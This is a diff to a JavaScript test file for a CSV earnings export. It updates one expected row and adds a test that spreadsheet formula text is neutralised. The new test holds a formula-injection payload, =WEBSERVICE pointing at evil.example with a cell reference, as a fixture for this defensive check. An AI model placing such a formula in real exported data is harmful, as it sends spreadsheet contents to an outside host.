@@ -157,8 +157,14 @@ t('csv: a header and one row per line, quoted where needed', () => {
   const [head, ...body] = csv.trim().split('\n');
   assert.equal(head, 'date,lane,kind,what,detail,where,yours_usd,source');
   assert.equal(body.length, 3);
-  assert.equal(body[0], '2026-10-22,Title sales,sale,The Salt Hours,$4.99 · a buyer,Stripe balance,3.57,pi_1');
+  // A sale names its own row, never the buyer's Stripe payment.
+  assert.equal(body[0], '2026-10-22,Title sales,sale,The Salt Hours,$4.99 · a buyer,Stripe balance,3.57,pu1');
   assert.equal(toCsv([{ at: '2026-10-01T00:00:00Z', lane: 'sales', kind: 'sale', label: 'Night, Bus', detail: 'said "hi"', where: 'x', cents: 100 }]).split('\n')[1], '2026-10-01,Title sales,sale,"Night, Bus","said ""hi""",x,1.00,');
+});
+
+t('csv: text that would run as a formula is neutralised, amounts stay numbers', () => {
+  const row = toCsv([{ at: '2026-10-01T00:00:00Z', lane: 'tips', kind: 'tip', label: '=WEBSERVICE("https://evil.example/?"&D2)', detail: '+1', where: '@x', cents: -226 }]).split('\n')[1];
+  assert.equal(row, `2026-10-01,Tips,tip,"'=WEBSERVICE(""https://evil.example/?""&D2)",'+1,'@x,-2.26,`);
 });
 
 t('money strings', () => {
